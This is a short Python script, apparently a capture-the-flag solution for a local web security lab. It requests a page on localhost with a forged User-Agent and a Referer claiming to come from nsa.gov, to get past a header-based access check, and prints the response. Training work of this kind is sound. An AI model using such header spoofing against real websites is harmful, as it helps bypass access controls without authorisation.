import requests

def main():
	header = {
		"User-Agent": "ft_bornToSec",
		"Referer": "https://www.nsa.gov/"
	}
	response = requests.get("http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f", headers=header)
	print(response.text)

if __name__ == "__main__":
	main()